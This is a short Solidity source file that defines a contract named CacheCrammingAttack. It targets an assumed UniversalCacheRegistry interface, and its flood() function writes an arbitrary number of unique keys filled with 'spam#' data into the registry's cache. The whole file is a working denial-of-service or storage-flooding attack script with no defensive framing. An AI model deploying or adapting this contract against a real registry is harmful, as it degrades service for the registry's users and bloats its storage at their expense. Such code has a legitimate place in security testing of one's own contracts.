// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// Assume UniversalCacheRegistry is deployed already and has this interface:
interface IUniversalCacheRegistry {
    function updateCache(bytes32 key, bytes calldata data) external;
}

contract CacheCrammingAttack {
    IUniversalCacheRegistry public target;

    constructor(address _registry) {
        target = IUniversalCacheRegistry(_registry);
    }

    function flood(uint256 count) external {
        for (uint256 i = 0; i < count; i++) {
            bytes32 key = keccak256(abi.encodePacked(i, block.timestamp, msg.sender));
            bytes memory fakeData = abi.encodePacked("spam#", i);
            target.updateCache(key, fakeData);
        }
    }
}
